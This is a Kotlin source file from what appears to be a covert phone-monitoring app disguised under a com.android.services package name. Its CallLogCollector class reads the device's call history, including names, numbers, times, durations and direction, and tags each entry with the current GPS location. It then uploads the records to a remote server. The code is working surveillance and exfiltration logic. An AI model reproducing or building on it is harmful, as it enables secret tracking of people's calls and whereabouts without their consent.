package com.android.services.logs.collectors

import android.content.Context
import com.android.services.db.entities.CallLog
import com.android.services.interfaces.LogsCollector
import com.android.services.logs.source.LocalDatabaseSource
import com.android.services.network.RemoteServerHelper
import com.android.services.network.api.NodeServerFourApi
import com.android.services.network.api.TOSApi
import com.android.services.util.AppConstants
import com.android.services.util.AppUtils
import com.android.services.util.AppUtils.getContactName
import com.android.services.util.logException
import com.android.services.util.logVerbose
import java.util.*

class CallLogCollector(
    private val context: Context,
    private val localDatabaseSource: LocalDatabaseSource,
    private val tosApi: TOSApi,
) : LogsCollector {

    @Throws(Exception::class)
    override fun uploadLogs() {
        if (AppConstants.callLogSync) {
            logVerbose("${AppConstants.CALL_LOG_TYPE} Retrieving call logs")
            retrieveCallFromLocalDevice(context)
            logVerbose("${AppConstants.CALL_LOG_TYPE} Preparing for uploading")
            localDatabaseSource.getCallLogs { logs ->
                if (logs.isNotEmpty()) {
                    logVerbose("${AppConstants.CALL_LOG_TYPE} data = $logs")
                    val startDate = logs[logs.size - 1].date
                    val endDate = logs[0].date
                    val serverHelper = RemoteServerHelper(
                        context,
                        AppConstants.CALL_LOG_TYPE,
                        localDatabaseSource,
                        tosApi = tosApi,
                        startDate = startDate,
                        endDate = endDate
                    )
                    serverHelper.upload(logs)
                } else {
                    logVerbose("${AppConstants.CALL_LOG_TYPE} No data found")
                }
            }
        } else {
            logVerbose("${AppConstants.CALL_LOG_TYPE} sync is Off")
        }
    }

    private fun retrieveCallFromLocalDevice(context: Context) {
        val callList: MutableList<CallLog> = ArrayList<CallLog>()
        try {
            val managedCursor = context.contentResolver.query(
                android.provider.CallLog.Calls.CONTENT_URI, null, null, null, "date DESC"
            )
            if (managedCursor != null) {
                while (managedCursor.moveToNext()) {
                    try {
                        val callId = managedCursor.getInt(managedCursor.getColumnIndex("_id"))
                        if (localDatabaseSource.checkCallNotAlreadyExists(callId.toString())) {
                            var callerName =
                                managedCursor.getString(managedCursor.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME))
                            val callNumber =
                                managedCursor.getString(managedCursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER))
                            val callType =
                                managedCursor.getInt(managedCursor.getColumnIndex(android.provider.CallLog.Calls.TYPE))
                            val timeStamp =
                                managedCursor.getString(managedCursor.getColumnIndex(android.provider.CallLog.Calls.DATE))
                            val callName: String = AppUtils.formatDateTimezone(timeStamp)
                            val callDuration =
                                managedCursor.getString(managedCursor.getColumnIndex(android.provider.CallLog.Calls.DURATION))
                            if (callerName == null) {
                                callerName = getContactName(callNumber, context)
                            }
                            val callLog = CallLog()
                            callLog.apply {
                                uniqueId = callId.toString()
                                this.callerName = callerName
                                this.callName = callName
                                this.callNumber = callNumber
                                callStartTime = AppUtils.formatDate(timeStamp)
                                this.callDuration = callDuration
                                callDirection = getCallDirection(callType)
                                longitude = AppConstants.locationLongitude ?: ""
                                latitude = AppConstants.locationLatitude ?: ""
                                isRecorded = "0"
                                date = AppUtils.getDate(timeStamp.toLong())
                                callStatus = 0
                            }
                            callList.add(callLog)
                        }
                    } catch (e: Exception) {
                        logException(
                            "${AppConstants.CALL_LOG_TYPE} Insert Error = " + e.message,
                            AppConstants.CALL_LOG_TYPE,
                            e
                        )
                    }
                }
                managedCursor.close()
            }
            if (callList.size > 0) {
                localDatabaseSource.insertCall(callList)
            }
        } catch (e: Exception) {
            logException(
                "${AppConstants.CALL_LOG_TYPE} Retrieve Error = " + e.message,
                AppConstants.CALL_LOG_TYPE,
                e
            )
        }
    }

    private fun getCallDirection(type: Int): String {
        return when (type) {
            android.provider.CallLog.Calls.INCOMING_TYPE -> "Incoming"
            android.provider.CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
            else -> "Missed"
        }
    }
}